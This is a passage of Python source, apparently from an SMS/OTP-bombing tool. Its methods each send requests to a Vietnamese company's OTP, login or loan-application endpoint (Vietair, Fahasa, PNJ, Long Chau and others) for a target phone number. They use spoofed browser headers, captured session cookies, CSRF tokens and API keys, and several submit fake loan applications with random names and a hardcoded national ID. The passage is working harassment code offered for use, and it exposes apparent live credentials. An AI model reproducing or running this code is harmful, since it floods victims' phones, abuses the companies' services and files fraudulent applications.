            session, "https://vietair.com.vn/Handler/CoreHandler.ashx",
            method="POST",
            headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://vietair.com.vn',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'referer': referer_url,
                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                },
            cookies={
                    '_gcl_au': '1.1.515899722.1720625176',
                    '_tt_enable_cookie': '1',
                    '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
                    '_fbp': 'fb.2.1720625180842.882992170348492798',
                    '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
                    '_gid': 'GA1.3.1511312052.1721112193',
                    '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
                    '_ga': 'GA1.1.186819165.1720625180',
                    '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
                },
            data={
                    'op': 'PACKAGE_HTTP_POST',
                    'path_ajax_post': '/service03/sms/get',
                    'package_name': 'PK_FD_SMS_OTP',
                    'object_name': 'INS',
                    'P_MOBILE': sdt,
                    'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
                },
            api_name="CALL_VIETAIR"
        )

    def send_call_FAHASA(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.fahasa.com/ajaxlogin/ajax/checkPhone",
            method="POST",
            headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://www.fahasa.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-requested-with': 'XMLHttpRequest',
                },
            cookies={
                    'frontend': '173c6828799e499e81cd64a949e2c73a',
                    'frontend_cid': '7bCDwdDzwf8wpQKE',
                },
            data={
                    'phone': sdt,
                },
            api_name="CALL_FAHASA"
        )

    def send_call_hopiness(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://shopiness.vn/ajax/user",
            method="POST",
            headers={
                    'Accept': '*/*',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'DNT': '1',
                    'Origin': 'https://shopiness.vn',
                    'Referer': 'https://shopiness.vn/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            data={
                    'action': 'verify-registration-info',
                    'phoneNumber': sdt,
                    'refCode': '',
                },
            api_name="CALL_HOPINESS"
        )

    def send_call_pantio(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.suplo.vn/v1/auth/customer/otp/sms/generate",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://pantio.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://pantio.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            data={
                    'phoneNumber': sdt,
                },
            params={
                    'domain': 'pantiofashion.myharavan.com',
                },
            api_name="CALL_PANTIO"
        )

    def send_call_Routine(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://routine.vn/customer/otp/send/",
            method="POST",
            headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'dnt': '1',
                    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMTc2ODQiLCJhcCI6IjExMzQ0MDAwMDciLCJpZCI6IjMzMmYyMzU2YTZlYmEwOWUiLCJ0ciI6ImRkNTQwNTk1ZDY4NWE3MTFjOTNhYjY5NzhkZmY1YTIzIiwidGkiOjE3MjI1MTk5OTE4MDR9fQ==',
                    'origin': 'https://routine.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://routine.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'traceparent': '00-dd540595d685a711c93ab6978dff5a23-332f2356a6eba09e-01',
                    'tracestate': '4217684@nr=0-1-4217684-1134400007-332f2356a6eba09e----1722519991804',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-newrelic-id': 'UAQGVlBbDBABVFZSBAkBVVcF',
                    'x-requested-with': 'XMLHttpRequest',
                },
            data={
                    'telephone': sdt,
                    'isForgotPassword': '0',
                },
            api_name="CALL_ROUTINE"
        )

    def send_call_vayvnd(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vayvnd.vn/v2/users",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi-VN',
                    'content-type': 'application/json; charset=utf-8',
                    'dnt': '1',
                    'origin': 'https://vayvnd.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://vayvnd.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'site-id': '3',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            api_name="CALL_VAYVND"
        )

    def send_call_tima(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://tima.vn/Borrower/RegisterLoanCreditFast",
            method="POST",
            headers={
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://tima.vn',
                    'priority': 'u=0, i',
                    'referer': 'https://tima.vn/vay-tien-online/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    'ASP.NET_SessionId': 'm1ooydpmdnksdwkm4lkadk4p',
                    'UrlSourceTima_V3': '{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"},
            data={
                    'application_full_name': generate_random_name(),
                    'application_mobile_phone': sdt,
                    'CityId': '1',
                    'DistrictId': '16',
                    'rules': 'true',
                    'TypeTime': '1',
                    'application_amount': '0',
                    'application_term': '0',
                    'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'IsApply': '1',
                    'ProvinceName': 'Thành phố Hà Nội',
                    'DistrictName': 'Huyện Sóc Sơn',
                    'product_id': '2',
                },
            api_name="CALL_TIMA"
        )

    def send_call_moneygo(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://moneygo.vn/dang-ki-vay-nhanh",
            method="POST",
            headers={
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://moneygo.vn',
                    'priority': 'u=0, i',
                    'referer': 'https://moneygo.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    'XSRF-TOKEN': 'eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D',
                    'laravel_session': 'eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
                },
            data={
                    '_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
                    'total': '56688000',
                    'phone': sdt,
                    'agree': '1',
                },
            api_name="CALL_MONEYGO"
        )

    def send_call_pico(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://auth.pico.vn/user/api/auth/register",
            method="POST",
            api_name="CALL_PICO"
        )

    def send_call_PNJ(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.pnj.com.vn/customer/otp/request",
            method="POST",
            headers={
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.pnj.com.vn',
                    'priority': 'u=0, i',
                    'referer': 'https://www.pnj.com.vn/customer/login',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
                    'CDPI_RETURN': 'New',
                    'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
                    'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
                    'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
                },
            data={
                    '_method': 'POST',
                    '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
                    'type': 'zns',
                    'phone': sdt,
                },
            api_name="CALL_PNJ"
        )

    def send_call_TINIWORLD(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://prod-tini-id.nkidworks.com/auth/tinizen",
            method="POST",
            headers={
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://prod-tini-id.nkidworks.com',
                    'priority': 'u=0, i',
                    'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            cookies={
                    'connect.sid': 's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
                },
            data={
                    '_csrf': '',
                    'clientId': '609168b9f8d5275ea1e262d6',
                    'redirectUrl': 'https://tiniworld.com',
                    'phone': sdt,
                },
            api_name="CALL_TINIWORLD"
        )

    def send_call_BACHHOAXANH(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://apibhx.tgdd.vn/User/LoginWithPassword",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Access-Control-Allow-Origin': '*',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://www.bachhoaxanh.com',
                    'Referer': 'https://www.bachhoaxanh.com/dang-nhap',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'authorization': 'Bearer 48AEFAE5FF6C90A31EBC7BB892756688',
                    'deviceid': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
                    'platform': 'webnew',
                    'referer-url': 'https://www.bachhoaxanh.com/dang-nhap',
                    'reversehost': 'http://bhxapi.live',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'xapikey': 'bhx-api-core-2022',
                },
            json={
                    'deviceId': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
                    'userName': sdt,
                    'isOnlySms': 1,
                    'ip': '',
                },
            data={
                    'deviceId': '1c4323a6-32d4-4ce5-9081-b5a4655ba7e6',
                    'userName': sdt,
                    'isOnlySms': 1,
                    'ip': '',
                },
            api_name="CALL_BACHHOAXANH"
        )

    def send_call_shbfinance(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://customer-app-nred.shbfinance.com.vn/api/web/SubmitLoan",
            method="POST",
            headers={
                    'Accept': 'application/json',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Authorization': 'Bearer',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://www.shbfinance.com.vn',
                    'Referer': 'https://www.shbfinance.com.vn/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            json={
                    'customerName': generate_random_name(),
                    'mobileNumber': sdt,
                    'campaignCode': '',
                    'documentIds': 'Cash',
                    'year': 1996,
                    'provinceName': 'An Giang',
                    'districtName': 'Châu Đốc',
                    'district': None,
                    'document': 'Vay tiền mặt',
                    'lendingAmt': 40000000,
                    'loanAmt': 40000000,
                    'lendingPeriod': 12,
                    'dateOfBirth': '01-Jan-1996',
                    'partnerName': 'Website',
                    'utmSource': 'WEB',
                    'utmMedium': 'form',
                    'utmCampaign': 'vay-tien-mat',
                },
            data={
                    'customerName': generate_random_name(),
                    'mobileNumber': sdt,
                    'campaignCode': '',
                    'documentIds': 'Cash',
                    'year': 1996,
                    'provinceName': 'An Giang',
                    'districtName': 'Châu Đốc',
                    'district': None,
                    'document': 'Vay tiền mặt',
                    'lendingAmt': 40000000,
                    'loanAmt': 40000000,
                    'lendingPeriod': 12,
                    'dateOfBirth': '01-Jan-1996',
                    'partnerName': 'Website',
                    'utmSource': 'WEB',
                    'utmMedium': 'form',
                    'utmCampaign': 'vay-tien-mat',
                },
            api_name="CALL_SHBFINANCE"
        )

    def send_call_mafccomvn(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/api.php",
            method="POST",
            headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://mafc.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://mafc.com.vn/vay-tien-nhanh',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
                },
            cookies={
                    'pll_language': 'vi',
                    'BIGipServerPool_www.mafc.com.vn': '654334730.20480.0000',
                    'mafcavraaaaaaaaaaaaaaaa_session_': 'BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB',
                    'MAFC01f6952f': '018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed',
                    'MAFC00000000233': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec',
                    'MAFC_101_DID': '0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9',
                    'MAFCed66693a184': '0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33',
                },
            json={
                    'usersName': 'tannguyen',
                    'password': 'mafc123!',
                    'income': 0,
                    'currAddress': 'Tp.Hcm',
                    'phoneNbr': sdt,
                    'nationalId': '034201009872',
                    'typeCreate': 'API',
                    'name': generate_random_name(),
                    'allowQualified': 'Y',
                    'email': 'b45b93f099',
                    'referralCode': '',
                    'age': '1992',
                    'vendorCode': 'INTERNAL_MKT',
                    'msgName': 'creatlead',
                    'priAddress': 'null',
                    'campaign': 'null',
                    'adsGroupName': 'null',
                    'adsName': 'null',
                    'paramInfo': '',
                    'mktCode': 'null',
                    'consentNd13': 'Y',
                },
            data={
                    'usersName': 'tannguyen',
                    'password': 'mafc123!',
                    'income': 0,
                    'currAddress': 'Tp.Hcm',
                    'phoneNbr': sdt,
                    'nationalId': '034201009872',
                    'typeCreate': 'API',
                    'name': generate_random_name(),
                    'allowQualified': 'Y',
                    'email': 'b45b93f099',
                    'referralCode': '',
                    'age': '1992',
                    'vendorCode': 'INTERNAL_MKT',
                    'msgName': 'creatlead',
                    'priAddress': 'null',
                    'campaign': 'null',
                    'adsGroupName': 'null',
                    'adsName': 'null',
                    'paramInfo': '',
                    'mktCode': 'null',
                    'consentNd13': 'Y',
                },
            api_name="CALL_MAFCCOMVN"
        )

    def send_call_phuclong(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-crownx.winmart.vn/as/api/plg/v1/user/check",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'authorization': 'Bearer undefined',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://order.phuclong.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://order.phuclong.com.vn/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
                    'x-api-key': 'bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3',
                },
            api_name="CALL_PHUCLONG"
        )

    def send_call_takomo(self, session, sdt: str) -> bool:
        return self.send_request(
            session=session,
            url="https://lk.takomo.vn/",
            method="GET",
            cookies={
                '__sbref': 'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
                '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
            },
            params={
                'phone': sdt,
                'code': 'resend',
                'channel': 'ivr',
                'amount': '2000000',
                'term': '7',
                'utm_source': 'pop_up',
                'utm_medium': 'organic',
                'utm_campaign': 'direct_takomo',
                'utm_content': 'mainpage_popup_login',
            },
            api_name="CALL_TAKOMO"
        )
    
    def send_k(self, session, sdt: str) -> bool:
        return self.send_request(
            session=session,
            url="https://api.onelife.vn/v1/gateway/",
            method="POST",
            headers={
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'domain': 'kingfoodmart',
                'sec-ch-ua-mobile': '?0',
                'authorization': '',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'content-type': 'application/json',
                'accept': '*/*',
                'Referer': 'https://kingfoodmart.com/',
                'sec-ch-ua-platform': '"Windows"',
            },
            json={
                'operationName': 'SendOtp',
                'variables': {
                    'input': {
                        'phone': sdt,
                        'captchaSignature': 'AWNCXZbkmtm8HOQPn3e-X5kQpLKbMAsrmlLAIhm2NBWvJStQYJ53ScQcbPQJS8o33FMyHYilnbdPtGcTr8ajL0ZA2QytqGB5tnIJsFZAFSPp-dfJKD5N1MQBZxqqp2xPcQfhYD30MZG-ingJCUGidN_b3Rc:U=2cffb4ffa0000000',
                    }
                },
            },
            api_name="K"
        )

    def send_n(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
            method="POST",
            headers={
                    'authority': 'api.nhathuoclongchau.com.vn',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
                    'access-control-allow-origin': '*',
                    'content-type': 'application/json',
                    'order-channel': '1',
                    'origin': 'https://nhathuoclongchau.com.vn',
                    'referer': 'https://nhathuoclongchau.com.vn/',
                    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
